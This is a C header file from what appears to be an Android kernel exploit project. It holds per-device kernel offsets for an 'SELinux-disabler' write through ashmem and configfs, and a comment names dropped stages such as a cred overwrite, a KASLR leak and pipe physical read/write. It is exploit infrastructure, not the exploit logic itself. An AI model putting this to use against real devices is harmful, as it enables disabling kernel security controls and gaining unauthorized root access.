#ifndef OFFSETS_H
#define OFFSETS_H

#include <stdint.h>

/* Only the offsets the SELinux-disabler write actually references.
 * Cred (Write 2), KASLR SLIDE leak, pipe physrw, cap_capable, kptr_restrict,
 * selinux_blob_sizes, security_hook_heads, kmalloc_caches, anon_pipe_buf_ops
 * and the ashmem_misc/ashmem_fops fops pointers are intentionally absent —
 * those stages were dropped from this build. */
struct kernel_offsets {
  const char *uname_r;
  uint64_t off_init_task, off_root_task_group, off_selinux_enforcing;
  uint64_t off_configfs_read_iter, off_configfs_bin_write_iter;
  uint64_t off_ashmem_ioctl, off_ashmem_compat_ioctl, off_ashmem_mmap;
  uint64_t off_ashmem_open, off_ashmem_release, off_ashmem_show_fdinfo;
  uint64_t off_copy_splice_read;
};

#define OFFSETS_ENTRY(uname, ...) { .uname_r = uname, __VA_ARGS__ }

static const struct kernel_offsets known_offsets[] = {
  /* Add new devices by creating src/devices/<name>/offsets.h */
#include "ace6t/offsets.h"
#include "op15/offsets.h"
  { .uname_r = NULL }
};

#endif
